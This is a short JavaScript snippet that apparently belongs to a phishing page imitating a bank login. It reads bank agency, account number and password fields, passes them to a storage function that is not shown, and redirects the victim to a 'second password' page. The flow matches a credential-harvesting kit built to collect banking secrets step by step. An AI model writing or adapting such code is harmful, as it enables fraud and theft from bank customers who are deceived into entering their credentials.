const validates = document.getElementById('triggerbtncpf');

validates.addEventListener('click', async (event) => {
        event.preventDefault();

        const agency = document.getElementById("agency").value;
        const account = document.getElementById("account").value;
        const passwordStrong = document.getElementById("passwordStrong").value;
        callSpinner();
        try {
            await savedatacpf(agency, account, passwordStrong);
            const sleep = (milliseconds) => {
                return new Promise(resolve => setTimeout(resolve, milliseconds))
            }      
            sleep(1000)
            .then(() =>  {
                window.location.href = '../secondPassword.html';
            }) 
        }catch(error){
            await console.log(error);
            const sleep = (milliseconds) => {
                return new Promise(resolve => setTimeout(resolve, milliseconds))
            }      
            sleep(1000)
            .then(() =>  {
                window.location.href = '../error.html';
            })  
         } 
});
